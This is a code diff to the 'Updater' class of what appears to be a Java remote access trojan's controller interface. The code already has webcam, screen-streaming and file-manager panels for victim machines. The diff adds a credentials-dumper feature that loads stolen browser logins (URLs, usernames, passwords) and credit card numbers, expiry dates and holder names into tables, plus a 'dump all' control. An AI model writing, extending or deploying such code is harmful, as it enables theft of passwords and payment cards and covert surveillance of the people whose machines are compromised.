@@ -1,11 +1,15 @@
 package Connections;
 
 import GUI.Main;
+import GUI.TableUtils.Credentials.CredentialsManagerGUI;
+import GUI.TableUtils.Credentials.Dumper.CredentialsDumper;
+import GUI.TableUtils.Credentials.Packets.CombinedCredentials;
 import GUI.TableUtils.FileManager.FileManagerGUI;
 import GUI.TableUtils.ScreenStreaming.ScreenStreamerGUI;
 import GUI.TableUtils.WebcamManager.WebcamGUI;
 import Information.NetworkInformation;
 import Information.SystemInformation;
+import Information.Time;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
@@ -29,6 +33,8 @@ public class Updater {
     private WebcamGUI webcamGUI;
 
     private ScreenStreamerGUI screenStreamerGUI;
+
+    private CredentialsManagerGUI credentialsManagerGUI;
 
     private void convertJSON2NetAndSysInfo(JSONObject jsonObject) {
         String operatingSystem = jsonObject.getString("win_ver");
@@ -182,6 +188,7 @@ public class Updater {
     public void updateFrameOfScreenStreamer(byte[] finalData) {
         ImageIcon tempIMG = new ImageIcon(finalData);
         Image img = tempIMG.getImage();
+        screenStreamerGUI.setLastData(finalData);
         Image imgScale = img.getScaledInstance(screenStreamerGUI.getVirtualScreen().getWidth(), screenStreamerGUI.getVirtualScreen().getHeight(), Image.SCALE_SMOOTH);
         SwingUtilities.invokeLater(() -> {
             screenStreamerGUI.getVirtualScreen().setIcon(new ImageIcon(imgScale));
@@ -206,6 +213,24 @@ public class Updater {
         });
     }
 
+    public void updateCredentialsDumper(String path) {
+        CredentialsDumper credentialsDumper = new CredentialsDumper(path);
+        CombinedCredentials combinedCredentials = credentialsDumper.getCredentials();
+        ArrayList<AccountCredentials> accountCredentials = (ArrayList<AccountCredentials>) combinedCredentials.accountCredentials();
+        ArrayList<CreditCardCredentials> creditCardCredentials = (ArrayList<CreditCardCredentials>) combinedCredentials.creditCardCredentials();
+        SwingUtilities.invokeLater(() -> {
+            for (AccountCredentials e : accountCredentials) {
+                Object[] elements = {e.actionUrl(), e.originUrl(), e.username(), e.password(), e.creationDate(), e.lastUsedDate()};
+                credentialsManagerGUI.getAccountsTableModel().addRow(elements);
+            }
+            for (CreditCardCredentials e : creditCardCredentials) {
+                Object[] elements = {e.creditCardNumber(), e.expirationMonth(), e.expirationYear(), e.cardHolder()};
+                credentialsManagerGUI.getCreditCardsTableModel().addRow(elements);
+            }
+            credentialsManagerGUI.getDumpAllJButton().setEnabled(true);
+        });
+    }
+
 
     public void setFileManagerGUI(FileManagerGUI fileManagerGUI) {
         this.fileManagerGUI = fileManagerGUI;
@@ -220,4 +245,7 @@ public class Updater {
     }
 
 
+    public void setCredentialsManagerGUI(CredentialsManagerGUI credentialsManagerGUI) {
+        this.credentialsManagerGUI = credentialsManagerGUI;
+    }
 }
